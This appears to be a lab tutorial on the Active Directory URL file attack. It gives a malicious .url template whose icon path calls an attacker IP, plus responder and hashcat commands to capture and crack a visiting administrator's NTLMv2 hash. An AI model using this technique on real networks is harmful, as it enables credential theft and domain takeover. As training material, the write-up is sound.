# URL File Attack LAB DEMO

URL File attack is a post compromise attack which uses the access of the compromised used to upload a malicious URL file to the domain share. 

For this attack scenario, we have already compromised a user account (`Bruce Wayne`) and also during our initial lab setup, we have created a file share named `hackme` on the Domain Controller.  <br>
In this case, we can make of use Bruce Wayne's access to the share and upload a malicious URL file into the share. 

Once this is uploaded, whenever a domain user access this share, the file automatically loads even without clicking on it. Through this event, we can capture the NTLMv2 credentials of that user which can be even an Administrator.

### CREATING A MALICIOUS URL FILE:

```
[InternetShortcut] 
URL=anyurl 
WorkingDirectory=anydir 
IconFile=\\<ATTACKER IP>\%USERNAME%.icon 
IconIndex=1
```

`[InternetShortcut]` : this is basic syntax of URL file.
`URL=anyurl`: specifies web address which loads when someone click on the shortcut
`WorkingDirectory=anydir ` : specifies the default working directory for the shortcut

`IconFile=\\<ATTACKER IP>\%USERNAME%.icon ` : This is the important line which comes into play during the attack. it specifies to load an icon file which is referenced to the attacker IP.

### EXPLOITATION:

- Once we created the malicious URL file we need to upload it to the SHARE folder where our compromised user have access.

- Now we should set up the `responder` tool to listen for events. 

```bash
responder -I eth0 -dvw
```

- When any other user (For ex: Administrator) on the machine access `hackme` folder on the share. 
- Since our file is named with an "@" symbol. It loads first and makes a connection to the our IP and `responder` captures the NTLMv2 hash of that user.

- An Administrator accessed the folder and `responder` successfully dumped the NTLMv2 hash of the administrator.
- Now we can uses tools like `hashcat` to crack this hash offline. and gain an ADMIN shell back using his credentials.

```bash
hashcat -m 5600 adminhash.txt /usr/share/wordlists/rockyou.txt -O
```
